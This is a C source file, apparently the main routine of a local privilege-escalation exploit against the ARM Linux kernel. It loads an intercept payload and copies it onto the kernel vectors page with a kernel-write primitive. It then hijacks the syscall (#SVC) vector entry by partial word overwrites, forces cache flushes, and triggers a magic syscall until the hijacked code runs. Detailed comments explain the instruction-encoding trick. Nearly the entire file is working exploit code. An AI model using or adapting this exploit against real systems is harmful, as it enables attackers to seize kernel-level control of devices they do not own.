#define _GNU_SOURCE
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sched.h>
#include "exploit.h"

static void handle_sigill(int s) {
	(void)s;
	return;
}

int main(int an, char **ac) {
	int i;
	int svc_fd;
	unsigned int svc_len;
	void *svc_mem;
	unsigned int hijack_address;

	find_vectors_page();
	if (vecpage == NULL) {
		fprintf(stderr, "main(): no vecpage at all / multiple vecpages found\n");
		return 1;
	}

	open_pts();

	prepare_squeezers();

	// load intercept code
	svc_fd = open("payload/svc_code", O_RDONLY);
	svc_len = lseek(svc_fd, 0, SEEK_END);
	svc_mem = mmap(NULL, svc_len, PROT_READ, MAP_SHARED, svc_fd, 0);
	if ((svc_fd < 0) || (svc_len == 0) || (svc_len == UINT_MAX) || (svc_mem == MAP_FAILED)) {
		fprintf(stderr, "main(): could not map/read svc_code\n");
		return 1;
	}

	// copy intercept code to offset 0xc00 onto vectors page
	while (1) {
		int written = memcpy_to_kernel(vecpage + 0xc00, svc_mem, svc_len);

		if (written < 0) {
			fprintf(stderr, "main(): memcpy_to_kernel() returned error\n");
			return 1;
		}

		if (written == (int)svc_len)
			break;
	}

	munmap(svc_mem, svc_len);
	close(svc_fd);

	// install pointer to our intercept code at offset 0xf10 of the vectors page
	hijack_address = (unsigned int)(vecpage_fixed_virtual + 0xc00);
	while (1) {
		int written = memcpy_to_kernel(vecpage + 0xf10, &hijack_address, 4);

		if (written < 0) {
			fprintf(stderr, "main(): memcpy_to_kernel() returned error\n");
			return 1;
		}

		if (written == 4)
			break;
	}

	if (an > 1) {
		fprintf(stderr, "main(): got an argument, aborting before the real hijack\n");
		(void)ac;
		return 0;
	}

	// yield the CPU now, so we start again with a new time slice
	signal(SIGILL, &handle_sigill);

	sched_yield();

	/**
	 * Redirect #SVC to our intercept code by performing a partial
	 * overwrite of the entry instruction. As we can only do full word
	 * writes, the overwrite will also affect parts of the previous
	 * instruction, the #UND entry instruction.
	 *
	 * The original situation looks like this:
	 *
	 * (#UND)	b	vector_und		65 04 00 ea
	 * (#SVC)	ldr	pc, [pc, #0xff0]	f0 ff 9f e5
	 *
	 * As #SVC is at (vecpage+8), the `ldr` instruction will pick up
	 * its value from (vecpage+0x1000) (pipelining!). We want to modify
	 * this to be
	 *
	 * (#SVC')	ldr	pc, [pc, #0xf00]	00 ff 9f e5
	 *
	 * which picks the address from (vecpage+0xf10) instead, where we
	 * placed ours above (see "hijack_address"). The required write to
	 * (vecpage+5) leaves the previous vector in the undesirable state
	 *
	 * (#UND')	andeq	r0, r0, r5, rrx		65 00 00 00
	 *
	 * meaning that #UND entries will fall through into our vector (as
	 * this is no longer a branch instruction) and might accidentally
	 * clobber a register (r0) depending on the condition 'EQ'.
	 * We can rectify this by immediately doing a second overwrite to
	 * (vecpage+4), changing #UND again to become
	 *
	 * (#UND'')	andeq	r0, r0, r0		00 00 00 00
	 *
	 * which is a NOP regardless of the condition flags. Our advantage is
	 * that both overwrites target the same cache line, so unless we get
	 * a cache flush of that line in between our two writes (which is
	 * highly unlikely), the system will never "see" the intermediate
	 * broken state of (#UND').
	 *
	 * Still we have the fallthrough, so our intercept code has to
	 * distinguish between syscalls (#SVC) and #UND entries and forward
	 * either ones appropriately.
	 */
	drain_inq_level();

	while (!kernel_value_present(vecpage + 0x8, 0xe59fff00)) {
		write_a_word(vecpage + 0x5);
		write_a_word(vecpage + 0x4);
	}

	(void)squeeze_data_cache();
	squeeze_insn_cache();

	/**
	 * We assume that the cache pressure has pushed our memory modifi-
	 * cations out of the data cache into main memory and flushed the
	 * instruction cache so that fetches of the vector page have to
	 * read main memory again.
	 *
	 * Now call our magical syscall #0 (== raw number 0xee0000). If for
	 * some reason the new code doesn't run (some locations are still
	 * cached and thus report old values, causing the instruction stream
	 * to take the old route), the kernel will report -ENOSYS, and we
	 * just yield the CPU and try again.
	 *
	 * Once the new code is entered, it will repair the #UND vector to
	 * have its original form again. We could also then disable the
	 * check for #UND fallthroughs in our svc_code, but that is left
	 * as an optimization exercise for ambitious completionists. :)
	 */
	while (1) {
		i = -1;

		asm volatile("dsb nsh\n\t"
			"mov r0, %1\n\t"
			"mov r7, #0xee0000\n\t"
			"svc #0\n\t"
			"mov %0, r0"
			: "=r" (i)
			: "r" (vecpage)
			: "r0", "r1", "r7", "memory");

		if (i == 0) {
			break;
		}

		fprintf(stderr, "-");

		sched_yield();
	}

	return i;
}
